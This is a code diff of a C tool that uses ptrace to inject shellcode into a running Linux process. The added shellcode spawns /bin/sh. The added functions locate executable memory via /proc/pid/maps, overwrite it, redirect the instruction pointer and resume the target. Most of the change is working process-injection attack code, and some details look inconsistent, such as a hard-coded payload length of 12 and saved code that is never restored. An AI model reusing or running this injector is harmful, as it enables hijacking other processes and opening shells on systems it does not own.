@@ -1,5 +1,6 @@
 #include <stdio.h>
 #include <stdlib.h>
+#include <stdint.h>
 #include <sys/ptrace.h>
 #include <sys/types.h>
 #include <string.h>
@@ -12,7 +13,7 @@
 //static size_t PAGE_SIZE = sysconf(_SC_PAGESIZE);
 
 
-char* payload = "\xb8\x3c\x00\x00\x00\xbf\x00\x00\x00\x00\x0f\x05";
+unsigned char shellcode[] = "\x90\x90\x90\x48\x31\xc0\x50\x48\x31\xf6\x48\x31\xd2\x48\xbb\x2f\x62\x69\x6e\x2f\x73\x68\x00\x53\x54\x5f\xb8\x3b\x00\x00\x00\x0f\x05";
 
 
 /**
@@ -41,93 +42,149 @@ unsigned long long findLibrary(const char *library, pid_t pid) {
 	fd = fopen(mapFilename, "r");
 
 	while(fgets(buffer, sizeof(buffer), fd)) {
-        //printf("%s\n", buffer);
 		if (strstr(buffer, library)) {
-            
 			addr = strtoull(buffer, NULL, 16);
 			break;
 		}
 	}
-
 	fclose(fd);
 
 	return addr;
 }
-/**
- * @brief Searches and returns the first instance of memory 
- * with execute permisisons within the targeted process
- * 
- * @param pid - pid of target process
- * @return void* 
- */
-void *findExeFreeSpaceAddr(pid_t pid) {
-    FILE *fp = NULL;
-    char filename[50] = {};
-    char line[ONEKB] = {};
-    char str[20] = {};
-    char perms[5] = {};
-    void *start_addr = NULL; 
-	void *end_addr = NULL;
 
+long freespaceaddr(pid_t pid)
+{
+	FILE *fp;
+	char filename[30];
+	char line[850];
+	long addr;
+	char str[20];
+	char perms[5];
 	sprintf(filename, "/proc/%d/maps", pid);
-    	if ((fp = fopen(filename, "r")) == NULL) {
-		printf("[!] Error, could not open maps file for process %d\n", pid);
+	fp = fopen(filename, "r");
+	if(fp == NULL)
 		exit(1);
-	}
-
-	while(fgets(line, 850, fp) != NULL) {
-        //printf("%s", line);
-		sscanf(line, "%p-%p %s %*s %s %*d", &start_addr, &end_addr, perms, str);
-
-		if(strstr(perms, "x") != NULL) {
-		    break;
+	while(fgets(line, 850, fp) != NULL)
+	{
+		sscanf(line, "%lx-%*x %s %*s %s %*d", &addr, perms, str);
+		printf("%s\n", line);
+		if(strstr(perms, "x") != NULL)
+		{
+			break;
 		}
-    }
+	}
+	printf("[+] Found executable memory at %lx\n", addr);
 	fclose(fp);
-	printf("[+] Found executable memory at 0x%p\n", start_addr);
-	return start_addr;
+	return addr;
 }
 
-void ptraceRead(int pid, unsigned long long addr, void *data, int len) {
-	long word = 0;
+
+/**
+ * @brief ptrace_read()
+ *
+ * Use ptrace() to read the contents of a target process' address space.
+ *
+ * args:
+ * @param int pid: pid of the target process
+ * @param unsigned long addr: the address to start reading from
+ * @param void *vptr: a pointer to a buffer to read data into
+ * @param int len: the amount of data to read from the target
+ *
+ */
+void ptrace_read(int pid, unsigned long addr, void *out_ptr, int len)
+{
+	int bytesRead = 0;
 	int i = 0;
-	char *ptr = (char *)data;
-
-	for (i=0; i < len; i+=sizeof(word), word=0) {
-		if ((word = ptrace(PTRACE_PEEKTEXT, pid, addr + i, NULL)) == -1) {;
-			printf("[!] Error reading process memory\n");
-			exit(1);
-		}
-		ptr[i] = word;
-	}
-}
-
-void ptraceWrite(int pid, unsigned long long addr, void *data, int len) {
 	long word = 0;
-	int i=0;
+	long *ptr = (long *)out_ptr;
 
-	for(i=0; i < len; i+=sizeof(word), word=0) {
-		memcpy(&word, data + i, sizeof(word));
-		if (ptrace(PTRACE_POKETEXT, pid, addr + i, word) == -1) {;
-			printf("[!] Error writing to process memory\n");
+	while (bytesRead < len) {
+		word = ptrace(PTRACE_PEEKTEXT, pid, (addr + bytesRead), NULL);
+		if(word == -1) {
+
+			printf("ptrace(PTRACE_PEEKTEXT) failed\n");
 			exit(1);
 		}
+		bytesRead += sizeof(word);
+		ptr[i++] = word;
+	}
+}
+
+/**
+ * @brief ptrace_write()
+ *
+ * Use ptrace() to write to the target process' address space.
+ *
+ * args:
+ * @param int pid: pid of the target process
+ * @param unsigned long addr: the address to start writing to
+ * @param void *vptr: a pointer to a buffer containing the data to be written to the
+ *   target's address space
+ * @param int len: the amount of data to write to the target
+ *
+ */
+void ptrace_write(int pid, unsigned long addr, void *vptr, int len)
+{
+	int byteCount = 0;
+	long word = 0;
+
+	while (byteCount < len)
+	{
+		memcpy(&word, vptr + byteCount, sizeof(word));
+		word = ptrace(PTRACE_POKETEXT, pid, (addr + byteCount), word);
+		if(word == -1)
+		{
+			printf("ptrace(PTRACE_POKETEXT) failed\n");
+			exit(1);
+		}
+		byteCount += sizeof(word);
 	}
 }
 
 
-int inject(int pid, void* dlopen_addr, void* payload, size_t payload_len){
 
-	struct user_regs_struct oldregs, regs;
+int inject(pid_t pid, void* dlopen_addr, void* payload, size_t payload_len){
+
+	struct user_regs_struct oldregs;
+	struct user_regs_struct regs;
 	int status;
 	unsigned char *oldcode;
-	void *freeaddr;
-	int x;
-
 	
+	// Clear any possible junk
+	memset(&oldregs, 0, sizeof(struct user_regs_struct));
+	memset(&regs, 0, sizeof(struct user_regs_struct));
+
+	// Attach to the target process
+	ptrace(PTRACE_ATTACH, pid, NULL, NULL);
+	if(0 > waitpid(pid, &status, WUNTRACED)){
+		printf("[-] Failure to catch SIGSTOP on target process\n");
+		return EXIT_FAILURE;
+	}
+	printf("[+] attached to PID: %d\n", pid);
+
+	// Store the current register values for later
+	ptrace(PTRACE_GETREGS, pid, NULL, &oldregs);
+	memcpy(&regs, &oldregs, sizeof(struct user_regs_struct));
 
 
-	return 0;
+	oldcode = malloc(sizeof(shellcode)*sizeof(uint8_t));
+
+	// find a good address to copy code to
+	long addr = freespaceaddr(pid);// + sizeof(long);
+
+	ptrace_read(pid, addr, oldcode, sizeof(shellcode));
+	
+	ptrace_write(pid, addr, shellcode, sizeof(shellcode));
+	
+	regs.rip = addr + 2;
+	ptrace(PTRACE_SETREGS, pid, NULL, &regs);
+
+	ptrace(PTRACE_CONT, pid, NULL, NULL);
+	ptrace(PTRACE_DETACH, pid, NULL, NULL);
+	//waitpid(pid, &status, WUNTRACED);
+	free(oldcode);
+
+	return EXIT_SUCCESS;
 }
 
 /**
@@ -177,7 +234,10 @@ int main(int argc, char* argv[]) {
 	printf("[*] dlopen() offset in libdl found to be 0x%llx bytes\n", (unsigned long long)(self_libdl_addr - self_libdl_exemem));
 	printf("[*] dlopen() in target process at address 0x%llx\n", (unsigned long long)dlopen_sym_addr);
 
-    findExeFreeSpaceAddr(atoi(argv[1]));
+    freespaceaddr(atoi(argv[1]));
+
+	printf("size of word %ld\n", sizeof(long));
+	inject(atoi(argv[1]),dlopen_sym_addr, shellcode, 12);
 
     return 0;
 }
